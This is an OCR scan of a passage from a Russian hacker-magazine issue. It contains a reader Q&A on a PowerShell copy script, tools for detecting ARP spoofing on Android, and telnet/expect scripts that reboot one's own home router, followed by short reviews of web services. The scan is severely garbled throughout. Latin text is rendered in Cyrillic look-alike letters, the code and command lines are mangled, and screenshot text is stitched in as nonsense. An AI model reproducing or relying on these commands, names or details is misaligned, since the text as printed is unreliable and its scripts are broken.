самому? 

□ Хотя это и недокументированная 
возможность, но в 01 Р-1 00 есть 
Теіпеі-сервер. Устанавливаем на свой комп 
Ехресі и пишем такой сценарий: 



$61ез | Сору-ІІет -ОезТіпаІіоп {тсі 
$_ . ОігесТогуМате . *-< 

Кер1асе("Е:\","2:\") -Рогсе} 

Очень часто приходится пользоваться 
разными интернет-сервисами с моего 
андроида в открытых \Ѵі-Рі-сетях. Как в та- 
ком случае обнаружить атаку типа АРР- 
спуфинг на мой телефон? 

Для детектирования атак типа АРР- 
спуфинг на твой Апсігоісі-девайс можно 
воспользоваться разработкой немецкого 
специалиста Андреаса Коха (Апсігеаз КосЫ, 
который, кстати говоря, и разработал нашумев- 
ший угонщик сессий под Апсігоісі посредством 
АРР-спуфинг-атаки ОгоігіБЬеер. Так вот, он же 
создал утилиту для детектирования подобного 
рода атак — ОгоісІБЬеер биапі ( сІгоісІзЬеер. 
с!е/?раде ісІ=265 ). При обнаружении изменений 
в АРР-кеше твоего девайса утилита отображает 
окно с предупреждением об атаке. Можно 
настроить автоматическое отключение №і-Рі 
в случае опасности. Это не единственное 
приложение такого рода. Более мощной 
альтернативой является платный (2,89 евро] 
ѴѴіРі Ргоіесіог. Очень полезной его возможно- 
стью является защита рутованных аппаратов 
от атак без отключения ѴѴі-Рі. 

□ На моем йІР-100 время от времени 

отваливается ^АИ-соединение, после 
чего роутеру помогает только перезагрузка. 



#!/изг/Ьіп/ехресТ --Р 

ехресі <<ео-Р 

1ое_изег 1 

зеі Тішеоиі 30 

зеі 5епсІ_5Іоы {1 1} 

зрамп Іеіпеі 192.168.1.1 

ехресі "1о§іп: " {зепсі -з "асІтіп\г"} 

ехресі "РаззмогсІ: " {зепсі -з ♦-< 

"ѴоигРаз5могсІ\г"} 

ехресі "СМО>" {зепсі -з ”сІЬ§\г”} 
ехресі "ОВС>" {5епсІ -з ”г5І\г"} 
ехресі еоі 

Для роутеров 0-Ііпк, которые официально 
поддерживают Теіпеі, можно замутить такой 
скрипт: 

$ (зіеер 2 ; есбо "асітіп" ; зіеер 2 ; 
есЬо "раззмогсГ ; 5Іеер 2 ; есЬо "геЬсю!" ; «-« 
зіеер 5) | Іеіпеі 192.168.1.1 

С помощью сгоп’а периодически проверя- 
ем доступность удаленного сервера и в слу- 
чае фейла отправляем железку на переза- 
грузку: 

$ зисіо сгопІаЬ -е 
* +/1 * * * * і-р ріпе _ с з 10 
мыы.уа.ги > /сіеѵ/пиіі; ІЬеп ехіі 1 ; 
еІ5е зН ~/Ьіп/сІіг_геЬоо1.5Іі; б □□ 



142 



ХАКЕР 01 /168/2013 





ІЖІТ5/ѴѴѴѴѴѴ2 



ѴѴѴѴѴѴ2 



РІасеИоІсІег I та дезы ««ус* 

ѴѴсЬгісѵчп оі РгіпІ. НЧ мтріс <ігк) оЬчоІиІсІу Ггге* 

Іи*>1 риі іНг сиМот ші т уош сосіс Іікс іЬіч 

Іо уош (К) / сіітіту ітадг 

Іо дм а гапгіот рсіигс Ы <00 X 200 ригк 
іо дгі ,і гіікіот дгау ркіигг оГ «00 х ЛЮ риНч 
ю дгі а гапйот ркішг Ы іЬг чро»і\ саігдску 
ю дгі рюше по 1/10 (ют |Ьг ірогіч саігдоіу 

юти а ппіот іяй оп те іапйопі іѵ-іиіе 
*ЛЬ а сівіош ігхі оо ІЬг чНггМ РЮиіг 




Инструмент для поиска «рыбных» картинок нужного разрешения 



1_0РЕМРІХЕІ_ 



ІогетріхеІ.сот 

Думаю, не стоит рассказывать тебе про многочисленные генераторы знаменитого 
текста на псевдолатыни. Интересно скорее то, что ІогетріхеІ позволяет решить ту же 
самую задачу для изображений. Сервис автоматически подбирает случайную картинку 
заданного размера (вплоть до 1920 на 1920 точек). Пользователь может выбрать цвето- 
вую гамму (цветную или черно-белую), а также тематику изображения. Впрочем, здесь 
может возникнуть та же проблема, что и с текстогенераторами, — случайный контент 
определенно не будет обладать теми же особенностями, что и реальный. Из-за этого 
«рыбная» картинка не позволит выявить реальных проблем, и использовать такие 
инструменты стоиттолько на ранних этапах прототипирования. 



ТАКЕ МЕ 

ТО АЫОТНЕК 

ІІ5ЕЕЕ55 

Ѵ/ЕВ5ІТЕ 



РЬЕАЗЕ 



ѴоиТиЬе для гиков в полном смысле этого слова, позволяющий публико- 
вать скринкасты непосредственно из консоли 



ТАКЕ МЕ ТО АЫОТНЕР Ц5ЕІ.Е55 ѴѴЕВ5ІТЕ, РІ.ЕА5Е 



ѵѵѵѵѵѵ.іЬеи5еІе55\л/еЬ.сот 

Дословно название сервиса переводится как «отведи меня на какой-нибудь бесполез- 
ный сайт, пожалуйста». Может показаться, что это просто идеальный инструмент для 
прокрастинации и БіитЫеОроп, доведенный до абсолюта, но сервис может служить 
неплохим источником вдохновения для веб-дизайнеров. Каждый сайт в базе — не- 
большой эксперимент, который показывает необычное применение РІазЬ, С55 и/или ^ 
и который будет любопытно повторить или обыграть в работе или с образовательными 
целями. Поэтому во многих случаях интереснее сразу браться за изучение исходного 
кода «бесполезной» страницы. Впрочем, некоторые ресурсы в подборке на самом деле 
бесполезны: они всего лишь поднимают настроение и избавляют от лишнего времени. 



АРСНІРУ 



агсЬііѵ.сот 

Сервис агсЬіІу решает достаточно насущную проблему: допустим, тебе попалась в Твитте- 
ре ссылка на интересную статью или годный интернет-магазин, но нужда в ней возникла 
значительно позже — и как быть? Увы, современные социальные сети не располагают 
адекватным поисковым функционалом, поэтому придется вспоминать, какой пользова- 
тель опубликовал эту запись и когда. АгсЫІу решает проблему, индексируя обновления в 
социальных сетях Тѵѵіиег, РасеЬоок и Кпкесііп «от лица» пользователя (для этого ему нуж- 
но дать соответствующий доступ) и историю браузера. После этого специальный плагин 
позволяет в любой момент запустить поиск по собранным данным и найти нужный пост. 





Расширение для НгеГох, позволяющее заглянутьв непростое будущее 
мобильныхОС 



РІРЕРОХ ОБ 5ІМШАТ0Р 



ЬІІ.Іѵ/55ѵѵеЦ 

Ребятам из МогіІІа удалось наглядно показать гибкость мобильной ОС, построенной це- 
ликом на базе веб-технологий, — для этого они представили ее эмулятор... в виде рас- 
ширения для браузера. Увы, поддерживается только Ріге^ох, зато на всех платформах. 

К сожалению, пока симуляция выполнена достаточно поверхностно и простейшие опе- 
рации (например, будильник) еще не реализованы. По этой причине на данный момент 
Рігеіох 05 Бітиіаіог лишь игрушка, но игрушка крайне занятная. Если разработчикам в 
конечном счете удастся сделать полноценный эмулятор ОС, работающий в браузере и 
пригодный для тестирования приложений под Рігеіох 05, — у новой платформы появит- 
ся интересное преимущество. 



144 



ХАКЕР 01 /168/2013 














